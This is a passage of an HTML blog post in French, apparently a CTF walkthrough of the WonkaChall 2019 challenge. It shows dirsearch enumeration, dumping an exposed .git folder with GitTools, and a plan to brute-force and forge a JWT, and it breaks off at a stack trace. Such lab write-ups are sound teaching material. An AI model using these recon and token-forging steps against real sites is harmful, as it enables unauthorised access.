@@ -1,0 +1,2834 @@
+<!DOCTYPE html>
+<html lang="">
+	
+	
+
+
+	<head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta http-equiv="Cache-Control" content="public" />
+	<!-- Enable responsiveness on mobile devices -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	
+	    
+	    
+	    
+	
+	<title>WonkaChall 2019 • Just another infosec blog</title>
+	
+	
+	<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="WonkaChall 2019"/>
+<meta name="twitter:description" content="Challenge from Akerva (french cybersecurity company), including Web, Active Directory and Linux stuff."/>
+
+	<meta property="og:title" content="WonkaChall 2019" />
+<meta property="og:description" content="Challenge from Akerva (french cybersecurity company), including Web, Active Directory and Linux stuff." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://maki.bzh/walkthrough/wonkachall2019/" />
+<meta property="article:published_time" content="2019-07-20T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2019-07-20T00:00:00&#43;00:00"/>
+
+
+    		
+	
+	
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css" integrity="sha256-90Y+fvi28WF+3jKH4tHEkoQ9WLeFKJjpvCPNOtU9ZvU= sha384-s+7l2WBKs5ChgZ+esoTV0aWZRcma7BxuSHlzBJz6PH4Cc4ZX3/ErQZtk+ZzYQy/X sha512-BiC3DH0qMCjCYqPNGAthQ95QCndm60uhfQVwhqZ2eG1zuGkP+3T1cw6PzEC4CiRfRIbd2qvyN39RoDfil/XcMA==" crossorigin="anonymous">
+	
+	
+	
+
+	<link rel="stylesheet" href="/css/hyde-hyde.css" integrity="sha256-cUUT8nKBmejGAmxYnpOnspTmwap5Sjc/nzRfeTTjgeQ=" crossorigin="anonymous">
+	<link rel="stylesheet" href="/css/custom.css" >
+	<link rel="stylesheet" href="/css/print.min.css" media="print" integrity="sha256-obkLPMZU5Kb+rPwjMazkJLfYW8H9dj6yh8Gzzs2dv5c=" crossorigin="anonymous">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g= sha384-qFIkRsVO/J5orlMvxK1sgAt2FXT67og+NyFTITYzvbIP1IJavVEKZM7YWczXkwpB sha512-UDJtJXfzfsiPPgnI5S1000FPLBHMhvzAMX15I+qG2E2OAzC9P1JzUwJOfnypXiOH7MRPaqzhPbBGDNNj7zBfoA==" crossorigin="anonymous"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE= sha384-ZoaMbDF+4LeFxg6WdScQ9nnR1QC2MIRxA1O9KWEXQwns1G8UNyIEZIQidzb0T1fo sha512-qWVvreMuH9i0DrugcOtifxdtZVBBL0X75r9YweXsdCHtXUidlctw7NXg5KVP3ITPtqZ2S575A0wFkvgS2anqSA==" crossorigin="anonymous"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="shortcut icon" href="/favicon.png">
+    	
+
+</head>
+
+
+	<body >
+				
+		<div class="sidebar">
+			<div class="container sidebar-about ">
+				<span class="site__title">
+				
+					<a href=""></a>
+				</span>
+				<a href="https://maki.bzh/">
+					
+					
+					
+					<div class="author-image">
+						<img src="https://maki.bzh/img/maki.jpg" alt="Author Image" class="img--circle img--headshot element--center"/>
+					</div>
+					
+				</a>
+				<p class="site__description">
+					<a href="https://maki.bzh/en">
+						
+					</a>
+				</p>
+				<div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/walkthrough/">
+						<span>Walkthrough</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/stupidthings/">
+						<span>Stupid Things</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/ctf/">
+						<span>CTF</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/friends/">
+						<span>Friends</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/whoami/">
+						<span>Who Am I?</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+				
+				<section class="social">
+						
+						<a href="https://twitter.com/maki_mitz" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						<a href="https://gitlab.com/maki_chaz" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						<a href="mailto:Yml0ZWRlcG91bGV0" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+						
+						
+					  &nbsp;<a href="https://www.root-me.org/Maki-37744" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.hackthebox.eu/home/users/profile/10265" target="blank" class="linklogo"><div class="rotate hackthebox_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+					  
+</section>
+
+				
+				
+				<p class="copyright">
+					&copy; 2020 Maki.
+					<br/>
+					<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+					<br/>Built with, Haax, Laluka, _ACKNAK_
+					<a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+					
+				</p>
+			</div>
+		</div>
+
+		<div class="content container">
+			
+	<article>
+	<header>
+		<h1>WonkaChall 2019</h1>
+		
+		
+<div class="post__meta">
+	
+	<i class="fas fa-calendar-alt"></i> Jul 20, 2019
+	
+	
+	<br/>
+	<i class="fas fa-clock"></i> 58 min read
+</div>
+
+
+	</header>
+	<hr/>
+	<div class="post">
+		<nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#i-step-1-erreur-de-développeur">I. Step 1 - Erreur de développeur</a>
+<ul>
+<li><a href="#tl-dr">TL;DR</a></li>
+<li><a href="#i-1-directory-listing">I.1. Directory listing</a></li>
+<li><a href="#i-2-git-dumping">I.2. Git dumping</a></li>
+<li><a href="#i-3-flag">I.3. Flag</a></li>
+<li><a href="#ressources">Ressources</a></li>
+</ul></li>
+<li><a href="#ii-step-2-une-histoire-de-jwt">II. Step 2 - Une histoire de JWT</a>
+<ul>
+<li><a href="#tl-dr-1">TL;DR</a></li>
+<li><a href="#ii-1-directory-listing">II.1. Directory listing</a></li>
+<li><a href="#ii-2-enumération-d-utilisateur">II.2. Enumération d&rsquo;utilisateur</a></li>
+<li><a href="#ii-3-ne-pas-oublier-le-git">II.3. Ne pas oublier le .git</a></li>
+<li><a href="#ii-4-enumération-web-sur-le-backend">II.4. Enumération web sur le backend</a></li>
+<li><a href="#ii-5-craquer-le-secret-du-jwt">II.5. Craquer le secret du JWT</a></li>
+<li><a href="#ii-6-flag">II.6. Flag</a></li>
+<li><a href="#resources">Resources</a></li>
+</ul></li>
+<li><a href="#iii-step-3-xxe-out-of-band">III. Step 3 - XXE Out-of-band</a>
+<ul>
+<li><a href="#tl-dr-2">TL;DR</a></li>
+<li><a href="#iii-1-reconnaissance">III.1. Reconnaissance</a></li>
+<li><a href="#iii-2-explication-de-l-exploitation">III.2. Explication de l&rsquo;exploitation</a></li>
+<li><a href="#iii-3-exploitation">III.3. Exploitation</a></li>
+<li><a href="#iii-4-flag">III.4. Flag</a></li>
+<li><a href="#resources-1">Resources</a></li>
+</ul></li>
+<li><a href="#iv-step-4-ssrf-to-kfc">IV. Step 4 - SSRF to KFC</a>
+<ul>
+<li><a href="#tl-dr-3">TL;DR</a></li>
+<li><a href="#iv-1-reconnaissance">IV.1. Reconnaissance</a></li>
+<li><a href="#iv-2-exploitation">IV.2. Exploitation</a></li>
+<li><a href="#iv-3-connexion-au-bucket-s3">IV.3. Connexion au bucket s3</a></li>
+<li><a href="#iv-5-flag">IV.5. Flag</a></li>
+<li><a href="#resources-2">Resources</a></li>
+</ul></li>
+<li><a href="#v-step-5-tom-cat-and-jerry">V. Step 5 - Tom(cat) and Jerry</a>
+<ul>
+<li><a href="#tl-dr-4">TL;DR</a></li>
+<li><a href="#v-1-reconnaissance">V.1. Reconnaissance</a>
+<ul>
+<li><a href="#v-1-a-172-16-42-5-dc01-ww2">V.1.a. 172.16.42.5 (DC01-WW2)</a></li>
+<li><a href="#v-1-b-172-16-42-11">V.1.b. 172.16.42.11</a></li>
+<li><a href="#v-1-c-172-16-42-101">V.1.c. 172.16.42.101</a></li>
+</ul></li>
+<li><a href="#v-2-enumération-du-serveur-web">V.2. Enumération du serveur web</a></li>
+<li><a href="#v-3-mise-en-place-de-l-exploitation">V.3. Mise en place de l&rsquo;exploitation</a>
+<ul>
+<li><a href="#v-3-a-nouvel-hôte">V.3.a. Nouvel hôte</a></li>
+<li><a href="#v-3-b-smb-server">V.3.b. SMB server</a></li>
+</ul></li>
+<li><a href="#v-4-exploitation">V.4. Exploitation</a></li>
+<li><a href="#v-5-reverse-shell">V.5. Reverse shell</a>
+<ul>
+<li><a href="#v-5-a-terminal-1-hôte">V.5.a. Terminal 1 - Hôte</a></li>
+<li><a href="#v-5-b-application-malveillante-serveur-tomcat">V.5.b. Application malveillante - Serveur tomcat</a></li>
+</ul></li>
+<li><a href="#v-5-flag">V.5. Flag</a></li>
+<li><a href="#resources-3">Resources</a></li>
+</ul></li>
+<li><a href="#vi-step-6-mimikatz-you-said">VI. Step 6 - Mimikatz you said ?</a>
+<ul>
+<li><a href="#tl-dr-5">TL;DR</a></li>
+<li><a href="#vi-1-post-exploitation">VI.1. Post exploitation</a></li>
+<li><a href="#vi-2-getting-lsass-minidump">VI.2. Getting lsass minidump</a></li>
+<li><a href="#vi-3-récupération-des-mots-de-passe-dans-le-minidump">VI.3. Récupération des mots de passe dans le minidump</a></li>
+<li><a href="#vi-4-flag">VI.4. Flag</a></li>
+<li><a href="#resources-4">Resources</a></li>
+</ul></li>
+<li><a href="#vii-step-7-spreading-love">VII. Step 7 - Spreading love</a>
+<ul>
+<li><a href="#tl-dr-6">TL;DR</a></li>
+<li><a href="#vii-1-reconnaissance">VII.1. Reconnaissance</a></li>
+<li><a href="#vii-2-mount-users-share">VII.2. Mount Users share</a></li>
+<li><a href="#vii-3-flag">VII.3. Flag</a></li>
+<li><a href="#resources-5">Resources</a></li>
+</ul></li>
+<li><a href="#viii-step-8-wagging-the-dogs">VIII. Step 8 - Wagging the dogs</a>
+<ul>
+<li><a href="#tl-dr-7">TL;DR</a></li>
+<li><a href="#viii-1-reconnaissance">VIII.1. Reconnaissance</a>
+<ul>
+<li><a href="#viii-1-a-bloodhound">VIII.1.a BloodHound</a></li>
+<li><a href="#viii-1-b-resource-based-constrained-delegation-explication">VIII.1.b Resource Based Constrained Delegation - Explication</a></li>
+</ul></li>
+<li><a href="#viii-2-mise-en-place-de-l-exploitation">VIII.2. Mise en place de l&rsquo;exploitation</a>
+<ul>
+<li><a href="#viii-2-a-vérification-des-droits-sur-le-domaine">VIII.2.a. Vérification des droits sur le domaine</a></li>
+<li><a href="#viii-2-b-ajout-d-une-machine-au-domaine">VIII.2.b. Ajout d&rsquo;une machine au domaine</a></li>
+<li><a href="#viii-2-c-modification-de-msds-allowedtoactonbehalfofotheridentity">VIII.2.c. Modification de msDS-AllowedToActOnBehalfOfOtherIdentity</a></li>
+</ul></li>
+<li><a href="#viii-3-exploitation">VIII.3. Exploitation</a></li>
+<li><a href="#viii-4-acquisition-du-ntds-dit">VIII.4. Acquisition du NTDS.dit</a></li>
+<li><a href="#viii-4-get-hashes">VIII.4. Get hashes</a></li>
+<li><a href="#viii-5-flag">VIII.5. Flag</a></li>
+<li><a href="#resources-6">Resources</a></li>
+</ul></li>
+<li><a href="#ix-step-9-not-so-hashed">IX. Step 9 - Not so hashed</a>
+<ul>
+<li><a href="#tl-dr-8">TL;DR</a></li>
+<li><a href="#ix-1-pass-the-hash">IX.1. Pass the hash</a></li>
+<li><a href="#ix-2-identifiant-de-veruca">IX.2. Identifiant de Veruca</a>
+<ul>
+<li><a href="#ix-2-a-méthode-1-à-la-main">IX.2.a. Méthode 1 - À la main</a></li>
+<li><a href="#ix-2-b-méthode-2-automatisée">IX.2.b. Méthode 2 - Automatisée</a></li>
+</ul></li>
+<li><a href="#ix-3-connexion-ssh-sur-le-poste-de-veruca">IX.3. Connexion SSH sur le poste de Veruca</a></li>
+<li><a href="#ix-4-flag">IX.4. Flag</a></li>
+<li><a href="#resources-7">Resources</a></li>
+</ul></li>
+<li><a href="#x-step-10-the-great-escape">X. Step 10 - The Great Escape</a>
+<ul>
+<li><a href="#tl-dr-9">TL;DR</a></li>
+<li><a href="#x-1-reconnaissance">X.1. Reconnaissance</a>
+<ul>
+<li><a href="#x-1-a-172-16-69-65">X.1.a. 172.16.69.65</a></li>
+<li><a href="#x-1-b-172-16-69-78-srv01-web-ww3">X.1.b. 172.16.69.78 (SRV01-WEB-WW3)</a></li>
+</ul></li>
+<li><a href="#x-2-connexion-ssh-au-serveur-distant">X.2. Connexion SSH au serveur distant</a></li>
+<li><a href="#x-3-escaping-the-restricted-shell">X.3. Escaping the restricted shell</a></li>
+<li><a href="#x-4-flag">X.4. Flag</a></li>
+<li><a href="#resources-8">Resources</a></li>
+</ul></li>
+<li><a href="#xi-step-11-free-flag">XI. Step 11 - Free flag</a>
+<ul>
+<li><a href="#tl-dr-10">TL;DR</a></li>
+<li><a href="#xi-1-trouver-la-clé-privé">XI.1. Trouver la clé privé</a></li>
+<li><a href="#xi-2-flag">XI.2. Flag</a></li>
+</ul></li>
+<li><a href="#xii-step-12-return-to-plankton">XII. Step 12 - Return to PLankTon</a>
+<ul>
+<li><a href="#tl-dr-11">TL;DR</a></li>
+<li><a href="#xii-1-post-exploitation">XII.1. Post exploitation</a></li>
+<li><a href="#xii-2-informations-sur-le-binaire">XII.2. Informations sur le binaire</a></li>
+<li><a href="#xii-3-explication-de-l-exploitation">XII.3. Explication de l&rsquo;exploitation</a></li>
+<li><a href="#xii-4-exploitation">XII.4. Exploitation</a>
+<ul>
+<li><a href="#xii-4-a-déterminer-le-padding">XII.4.a. Déterminer le padding</a></li>
+<li><a href="#xii-4-b-récupérer-l-adresse-de-system">XII.4.b. Récupérer l&rsquo;adresse de system</a></li>
+<li><a href="#xii-4-c-trouver-un-bon-gadget">XII.4.c. Trouver un bon gadget</a></li>
+<li><a href="#xii-4-d-trouver-l-adresse-de-la-chaîne-gnu">XII.4.d. Trouver l&rsquo;adresse de la chaîne GNU</a></li>
+<li><a href="#xii-4-e-ajout-d-un-binaire-gnu-dans-le-path">XII.4.e. Ajout d&rsquo;un binaire GNU dans le PATH</a></li>
+</ul></li>
+<li><a href="#xii-5-exécution">XII.5. Exécution</a></li>
+<li><a href="#xii-6-flag">XII.6. Flag</a></li>
+<li><a href="#resources-9">Resources</a></li>
+</ul></li>
+<li><a href="#xiii-step-13-the-final-countdown">XIII. Step 13 - The final countdown</a>
+<ul>
+<li><a href="#tl-dr-12">TL;DR</a></li>
+<li><a href="#xiii-1-post-exploitation">XIII.1. Post exploitation</a></li>
+<li><a href="#xiii-2-mise-en-place-du-pivot">XIII.2. Mise en place du pivot</a></li>
+<li><a href="#xiii-3-scan-de-port">XIII.3. Scan de port</a></li>
+<li><a href="#xiii-4-montage-du-volume-nfs">XIII.4. Montage du volume NFS</a></li>
+<li><a href="#xiii-5-copie-des-fichiers-du-volume">XIII.5. Copie des fichiers du volume</a></li>
+<li><a href="#xiii-6-flag">XIII.6. Flag</a></li>
+<li><a href="#resources-10">Resources</a></li>
+</ul></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul></li>
+</ul>
+</nav>
+		
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Cette année, lors de l&rsquo;évènement LeHack 2019, nous avons assisté au lancement de la seconde édition du <strong>WonkaChallenge</strong> réalisé par <a href="https://akerva.com/">Akerva</a>. Lors de la première édition, nous pouvions nous confronter à un certain nombre d&rsquo;épreuves,  d&rsquo;abord des challenges web puis de l&rsquo;Active Directory. Les writeups officiels de l&rsquo;édition de l&rsquo;année dernière se trouvent ici :</p>
+
+<ol>
+<li>Williwonka.shop : <a href="https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/">https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/</a></li>
+<li>Pramafil.com : <a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/">https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/</a></li>
+<li>Compromission SI pramafil : <a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/">https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/</a></li>
+<li>Compromission du domaine DEV : <a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/">https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/</a></li>
+<li>Comme à la maison : <a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/">https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/</a></li>
+</ol>
+
+<p>Cette année, le WonkaChall a continué sur la même lancée et s&rsquo;est étoffé d&rsquo;une partie pwn et Linux à la fin. Cet article a pour but de présenter ma méthode de résolution des 13 épreuves. Akerva a aussi mis en ligne un writeup officiel, que vous pouvez retrouver ci-dessous :</p>
+
+<ol>
+<li>Part 1 - WEB : <a href="https://akerva.com/blog/wonkachall-akerva-lehack-2019-write-up-part-1-web/">https://akerva.com/blog/wonkachall-akerva-lehack-2019-write-up-part-1-web/</a></li>
+<li>Part 2 - WINDOWS : <a href="https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-2-windows/">https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-2-windows/</a></li>
+<li>Part 3 - LINUX : <a href="https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-3-linux/">https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-3-linux/</a></li>
+</ol>
+
+<p>Cet article va se découper en 13 parties, une pour chaque flag à trouver. Mais avant d&rsquo;entrer dans le vif du sujet, ci-dessous un schéma du réseau complet (attention, petit spoil :)) :</p>
+
+<p><img src="/img/writeups/wonkachall2019/network_diagram_vm_nat.png" alt="" /></p>
+
+<p>Certaines épreuves nécessitent du Windows et d&rsquo;autres du Linux, donc je switch entre ma Commando (Windows) et ma Kali (Linux). Ma configuration est plutôt simple, un hôte Windows 10 avec VMWare pro et les deux VM en NAT. Maintenant que tous les prérequis sont présentés, j&rsquo;espère que la lecture vous sera agréable !</p>
+
+<p>Le point d&rsquo;entrée du challenge se trouve ici : <a href="https://willywonka.shop">https://willywonka.shop</a></p>
+
+<p><img src="https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif" alt="" /></p>
+
+<h2 id="i-step-1-erreur-de-développeur">I. Step 1 - Erreur de développeur</h2>
+
+<blockquote>
+<p>Let&rsquo;s start easy, what are the latest changes made to the website ?</p>
+</blockquote>
+
+<h3 id="tl-dr">TL;DR</h3>
+
+<ol>
+<li>Utiliser dirsearch et trouver le dossier <code>.git</code> ;</li>
+<li>Avec <code>GitTools -&gt; dumper -&gt; extractor</code>, récupérer le git et les anciens commits ;</li>
+<li>Le premier flag se situe dans le fichier <code>.git/COMMIT_EDITMSG</code>.</li>
+</ol>
+
+<hr />
+
+<h3 id="i-1-directory-listing">I.1. Directory listing</h3>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step1_index.png" alt="" />
+<em>Fig 1</em> : Index du site
+</center></p>
+
+<p>La première chose que je fais en arrivant sur un site est lancer <code>dirsearch</code>. La wordlist par défaut est vraiment pertinente et en général, ce qu&rsquo;elle sort se transforme en quick win :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ ./dirsearch.py -u https://willywonka.shop/ -e html,php,txt           
+
+Extensions: .html, .php, .txt | HTTP method: get | Threads: 10 | Wordlist size: 6878
+
+Target: https://willywonka.shop/
+
+[01:29:23] Starting: 
+[01:29:23] 400 -  166B  - /%2e%2e/google.com
+[01:29:23] 308 -  263B  - /.git
+[01:29:23] 200 -  973B  - /.git/
+[01:29:23] 200 -  449B  - /.git/branches/
+[01:29:23] 200 -  130B  - /.git/COMMIT_EDITMSG
+[01:29:23] 200 -    1KB - /.git/hooks/
+[01:29:23] 200 -  276B  - /.git/config
+[01:29:23] 200 -  495B  - /.git/info/
+[01:29:24] 200 -   73B  - /.git/description
+[01:29:24] 200 -   23B  - /.git/HEAD
+[01:29:24] 200 -  240B  - /.git/info/exclude
+[01:29:24] 200 -  542B  - /.git/logs/
+[01:29:24] 200 -    2KB - /.git/index
+[01:29:24] 200 -  355B  - /.git/logs/HEAD
+[01:29:24] 200 -  528B  - /.git/logs/refs/heads
+[01:29:24] 200 -  355B  - /.git/logs/refs/heads/master
+[01:29:24] 200 -  504B  - /.git/logs/refs
+[01:29:24] 200 -    2KB - /.git/objects/
+[01:29:24] 200 -   41B  - /.git/refs/heads/master
+[01:29:24] 200 -  545B  - /.git/refs/
+[01:29:24] 200 -  508B  - /.git/refs/heads
+[01:29:24] 200 -  445B  - /.git/refs/tags
+[01:29:35] 200 -    5KB - /login
+[01:29:35] 302 -  209B  - /logout  -&gt;  http://willywonka.shop/
+[01:29:37] 500 -  290B  - /profile
+[01:29:38] 200 -    4KB - /register
+[01:29:38] 200 -    4KB - /reset
+[01:29:39] 302 -  265B  - /submit  -&gt;  http://willywonka.shop/profile?filetype=image%2Fpng
+</code></pre>
+
+<p>On tombe sur un dossier <code>.git</code>. Même si ce genre de dossier affiche un beau &ldquo;403 Forbidden&rdquo;, les fichiers sont souvent accessibles :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step1_git.png" alt="" />
+<em>Fig 2</em> : Dossier git accessible
+</center></p>
+
+<p>Il nous est donc possible de récupérer le contenu des anciens commits grâce à <code>GitTools</code>.</p>
+
+<h3 id="i-2-git-dumping">I.2. Git dumping</h3>
+
+<p>Pour obtenir l&rsquo;intégralité du <code>git</code>, on va d&rsquo;abord utiliser le script <code>gitdumper.sh</code>, puis <code>extractor.sh</code> pour les différents commits.</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ mkdir out_dump  
+(KaliVM) ➜ /opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ out_dump
+
+[*] Destination folder does not exist
+[+] Creating a/.git/
+[+] Downloaded: HEAD
+[...]
+
+(KaliVM) ➜ mkdir out_extract
+(KaliVM) ➜ /opt/t/pentest/exploit/GitTools/Extractor/extractor.sh out_dump out_extract                         
+
+[+] Found commit: 8cda59381a6755d33425cb4ccddcc011a85649c6
+[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/.env
+[...]
+[+] Found commit: 7a1756aae221342ab09f9101358201bbfa70a702
+[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/.env
+[...]
+</code></pre>
+
+<p>Il ne reste plus qu&rsquo;à aller chercher le flag :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ cat out_dump/.git/COMMIT_EDITMSG 
+Added debug mode with &quot;debug=1&quot; GET param
+
+A wild flag appears !
+16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009
+</code></pre>
+
+<h3 id="i-3-flag">I.3. Flag</h3>
+
+<blockquote>
+<p>16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009</p>
+</blockquote>
+
+<hr />
+
+<h3 id="ressources">Ressources</h3>
+
+<ol>
+<li><strong>maurosoria</strong>, <em>dirsearch</em>, GitHub : <a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li>
+<li><strong>internetwache</strong>, <em>GitTools</em>, GitHub : <a href="https://github.com/internetwache/GitTools">https://github.com/internetwache/GitTools</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="ii-step-2-une-histoire-de-jwt">II. Step 2 - Une histoire de JWT</h2>
+
+<blockquote>
+<p>A &lsquo;deadbeef&rsquo; ticket was submitted. Who&rsquo;s the victim ?</p>
+</blockquote>
+
+<h3 id="tl-dr-1">TL;DR</h3>
+
+<ol>
+<li>Faire de l&rsquo;audit de code grâce au <code>.git</code> trouvé dans l&rsquo;étape d&rsquo;avant, trouver le <code>debug=1</code> dans la configuration de Symphony ;</li>
+<li>Mettre la page <code>/reset</code> en mode debug afin de récupérer une stacktrace : <code>https://willywonka.shop/reset?debug=1</code> ;</li>
+<li>Dans la stacktrace ,trouver un sous-domaine (<code>backend.willywonka.shop</code>) et un JSON Web Token (JWT) ;</li>
+<li>Il existe une autre page <code>/reset</code> sur le backend. Grâce à cette page, on sait que le site attend un JWT dans le cookie <code>backend-session</code> ;</li>
+<li>L&rsquo;analyse du JWT récupéré dans la stacktrace montre qu&rsquo;il est protégé par une clé secrète (HS256) ;</li>
+<li>Le bruteforcer avec <code>rockyou</code> et trouver la clé <code>s3cr3t</code> ;</li>
+<li>Forger un nouveau token avec un utilisateur valide (<code>aas</code>) et une expiration lointaine, donnant la requête :<code>https://backend.willywonka.shop/reset/jwt_craft</code>. La liste des comptes se trouve sur la page d&rsquo;accueil du frontend ;</li>
+<li>Une fois la mire d&rsquo;authentification passée, il ne reste qu&rsquo;à chercher le ticket <code>deadbeef</code>.</li>
+</ol>
+
+<hr />
+
+<h3 id="ii-1-directory-listing">II.1. Directory listing</h3>
+
+<p>En enlevant les fichiers liés au <code>.git</code> du <code>dirsearch</code> précédent, il reste les pages suivantes :</p>
+
+<pre><code class="language-bash">[11:10:46] 200 -    5KB - /login
+[11:10:47] 302 -  209B  - /logout  -&gt;  http://willywonka.shop/
+[11:10:51] 500 -  290B  - /profile
+[11:10:52] 200 -    4KB - /register
+[11:10:52] 200 -    4KB - /reset
+[11:10:55] 302 -  265B  - /submit  -&gt;  http://willywonka.shop/profile?filetype=image%2Fpng
+</code></pre>
+
+<h3 id="ii-2-enumération-d-utilisateur">II.2. Enumération d&rsquo;utilisateur</h3>
+
+<p>Lors de l&rsquo;utilisation de l&rsquo;application, on se rend compte qu&rsquo;il est possible de faire de l&rsquo;énumération d&rsquo;utilisateur :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step2_unable_to_find_user.png" alt="" />
+<em>Fig 3</em> : Impossible de trouver l&rsquo;utilisateur
+</center></p>
+
+<p>Pour tester cette théorie, j&rsquo;ai choisi une liste d&rsquo;utilisateurs provenant du GitHub SecList
+. Elle est plutôt courte, donc rapide. L&rsquo;intruder de Burp fait l&rsquo;affaire pour ce test :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step2_intruder.png" alt="" />
+<em>Fig 4</em> : Enumération d&rsquo;utilisateur <sup>1</sup>&frasl;<sub>2</sub>
+</center></p>
+
+<p>Si un utilisateur valide est soumit à l&rsquo;application, alors cette application renvoie&hellip; Une erreur 500. À savoir aussi que ce bruteforce d&rsquo;utilisateur ne sert <strong>à rien</strong> et m&rsquo;a même fait perdre du temps par la suite. La liste des utilisateurs peut être trouvée sur l&rsquo;index du site :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step2_users_list_index.png" alt="" />
+<em>Fig 5</em> : Enumération d&rsquo;utilisateurs <sup>2</sup>&frasl;<sub>2</sub>
+</center></p>
+
+<p>Les utilisateurs sont donc :</p>
+
+<ul>
+<li>n0wait</li>
+<li>qsec</li>
+<li>cybiere</li>
+<li>meywa</li>
+<li>itm4n</li>
+<li>aas</li>
+<li>xXx_d4rkR0xx0r_xXx</li>
+</ul>
+
+<h3 id="ii-3-ne-pas-oublier-le-git">II.3. Ne pas oublier le .git</h3>
+
+<p>En regardant de plus près les sources obtenues dans le <code>.git</code> de l&rsquo;étape 1, on remarque qu&rsquo;il y a une histoire de debug. Une variable <code>/?debug=1</code> :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ cat 0-7a1756aae221342ab09f9101358201bbfa70a702/config/routes.yaml 
+#index:
+#    path: /
+#    controller: App\Controller\DefaultController::index
+debug:
+    path: /?debug=1
+    controller: #TODO#
+</code></pre>
+
+<p>N&rsquo;étant pas familier avec Symphony, j&rsquo;ai perdu du temps à comprendre pourquoi cette variable ne fonctionnait pas sur la route principale. Finalement, en plaçant un utilisateur valide (tel que <code>aas</code>) dans le formulaire de reset et en ajoutant le paramètre GET, le framework renvoie la stacktrace de l&rsquo;application :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step2_stacktrace.png" alt="" />
+<em>Fig 6</em> : Stacktrace de l&rsquo;application
+</center></p>
+
+<blockquote>
+<p><a href="https://willywonka.shop/reset?debug=1">https://willywonka.shop/reset?debug=1</a></p>
+</blockquote>
+
+<pre><code class="language-json">Fatal error: Uncaught exception 'Swift_TransportException' with message 'Expected response code 354 but got code &quot;566&quot;, with message &quot;566 SMTP limit exceeded&quot;' in /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php:386
+
+Stack trace:
